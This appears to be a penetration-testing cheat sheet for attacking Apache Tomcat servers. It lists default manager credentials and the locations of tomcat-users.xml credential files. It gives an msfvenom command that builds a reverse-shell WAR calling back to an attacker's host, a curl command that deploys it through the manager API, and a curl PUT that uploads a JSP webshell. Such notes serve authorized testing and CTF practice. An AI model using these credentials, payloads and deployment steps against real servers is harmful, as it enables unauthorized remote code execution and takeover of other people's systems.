# Tomcat

## Default credentials

{% code overflow="wrap" %}
```sh
# The most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files (execute code). 

# But this path is protected by basic HTTP auth, the most common credentials are:
admin:admin
admin:tomcat
admin:<NOTHING>
admin:s3cr3t
admin:s3cret
tomcat:s3cr3t
tomcat:tomcat
tomcat:<NOTHING>
tomcat:s3cret
```
{% endcode %}

## Credential files

```
/etc/tomcat7/tomcat-users.xml
/var/lib/tomcat7/conf/tomcat-users.xml

C:\Program Files\Apache Software Foundation\Tomcat 9.0\conf
C:\Program Files (x86)\Apache Software Foundation\Tomcat 8.0\bin
```

## Exploits

{% embed url="https://www.exploit-db.com/exploits/42953" %}

## WAR upload

#### **Since our tomcat user only has the manager-script role, and not the usual manager-gui role, we can use only use the tomcat /manager/text/… scripting api.**

{% code overflow="wrap" fullWidth="true" %}
```bash
# First, we’ll need a reverse shell inside of a WAR file. Msfvenom will get the job done
msfvenom -p java/shell_reverse_tcp lhost=x.x.x.x lport=xxxx -f war -o pwn.war

# Upload the WAR file:
curl -v -u 'tomcat:$pass' --upload-file pwn.war 'http://x.x.x.x:8080/manager/text/deploy?path=/foo&update=true'

# Finally, go to http://$IP:8080/foo to trigger the reverse shell.
```
{% endcode %}

## JSP webshell

```bash
curl -u admin:admin -v -X PUT --data @cmd.jsp $PATH

# Upload a .jsp webshell then visit $PATH/cmd.jsp?cmd=whoami
```

## Windows (host-manager variant)

[https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/](https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/)
